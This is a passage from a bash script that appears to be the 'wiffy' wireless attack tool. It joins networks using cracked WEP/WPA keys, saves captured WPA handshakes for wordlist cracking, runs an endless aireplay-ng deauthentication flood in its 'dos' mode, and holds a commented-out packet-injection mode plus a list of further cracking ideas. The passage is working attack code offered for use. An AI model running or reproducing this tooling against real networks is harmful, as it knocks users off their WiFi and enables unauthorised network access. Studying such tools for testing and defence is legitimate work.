         display action "Joining: $essid"
         action "Starting 'wicd service'" "/etc/init.d/wicd start"           # Backtrack
         action "Starting 'network manager'" "service network-manager start" # Ubuntu
         if [ "$encryption" == "WEP" ] ; then
            action "i[f/w]config" "ifconfig $interface down && iwconfig $interface essid $essid key $key && ifconfig $interface up"
         elif [ "$encryption" == "WPA" ] ; then
            action "wpa_passphrase" "wpa_passphrase $essid '$key' > /tmp/wiffy.tmp"
            action "wpa_supplicant" "wpa_supplicant -B -i $interface -c /tmp/wiffy.tmp -D wext"
            cp -f "/tmp/wiffy.tmp" "wpa.conf"
         fi
         sleep 5
         action "dhclient" "dhclient $interface"
         if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then
            ourIP=$(ifconfig $interface | awk '/inet addr/ {split ($2,A,":"); print A[2]}')
            display info "IP: $ourIP"
            #gateway=$(route -n | grep $interface | awk '/^0.0.0.0/ {getline; print $2}')
            #display info "Gateway: $gateway"
         fi
      fi
   #----------------------------------------------------------------------------------------------#
   elif [ "$encryption" == "WPA" ] ; then
      if [ -e "$wordlist" ] ; then display error "WiFi key isn't in the wordlist" 1>&2
      else display error "There isn't a wordlist at: $wordlist" 1>&2 ; fi
      display action "Moving handshake: $(pwd)/wiffy-$essid.cap" 1>&2
      action "Moving capture" "mv -f /tmp/wiffy*.cap $(pwd)/wiffy-$essid.cap"
   #----------------------------------------------------------------------------------------------#
   elif [ "$encryption" != "N/A" ] ; then
      display error "Something went wrong )=" 1>&2
   fi

#----------------------------------------------------------------------------------------------#
elif [ "$mode" == "dos" ] ; then
   display action "Attack (DOS): $essid"
   command="aireplay-ng --deauth 0 -e \"$essid\" -a $bssid"
   if [ "$client" != "clientless" ] ; then command="$command -c $client" ; fi
   command="$command $monitorInterface"
   action "aireplay-ng (DeAuth)" "$command" &

   #----------------------------------------------------------------------------------------------#
   display info "Attacking! ...press CTRL+C to stop"
   if [ "$diagnostics" == "true" ] ; then echo "-Ready!----------------------------------" >> $logFile ; fi
   for (( ; ; )) ; do
      sleep 5
   done
#----------------------------------------------------------------------------------------------#
#elif [ "$mode" == "inject" ] ; then
#   display action "Attack (Inject): $essid"
#   if [ "$encryption" != "WEP" ] ; then display error "Only works on WEP networks" 1>&2 ; cleanup ; fi

#   action "aireplay-ng (Inject)" "airtun-ng -a $bssid $monitorInterface" &
#   action "aireplay-ng (Inject)" "ifconfig at0 192.168.1.83 netmask 255.255.255.0 up" &

#   action "Monitor Mode (Starting)" "airmon-ng start $interface | tee /tmp/wiffy.tmp"
#   command=$(cat /tmp/wiffy.tmp | grep ^$interface | awk -F "-" '{print $1}' | awk -F "$interface" '{print $2}' | sed 's/\"//' )
#   Chipset - Driver
#   /pentest/wireless/airpwn-1.4/airpwn -c conf/greet_html -d $driver -i $monitorInterface -vvvv

   #----------------------------------------------------------------------------------------------#
#   display info "Attacking! ...press CTRL+C to stop"
#   if [ "$diagnostics" == "true" ] ; then echo "-Ready!----------------------------------" >> $logFile ; fi
#   for (( ; ; )) ; do
#      sleep 5
#   done
fi

#----------------------------------------------------------------------------------------------#
if [ "$diagnostics" == "true" ] ; then echo "-Done!---------------------------------------------------------------------------------------" >> $logFile ; fi
cleanup clean


#---Ideas--------------------------------------------------------------------------------------#
# WEP - Chopchop/FagmentationAP Packet Broadcast
# WPA - aircrack/coWPAtty
# WPA - brute / hash
# WPA - calculate hash
# WPA - use pre hash / use pre capture
# WPA - use folder for wordlist
# WiFi Key is in hex
# update - aircrack/coWPATTY
# decrypt packets - offline & online (airtun-ng)
# Mode - Injection - GET WORKING
# Create output file?
# display error "The encryption ($encryption) on $essid isn't support" 1>&2 ; cleanup
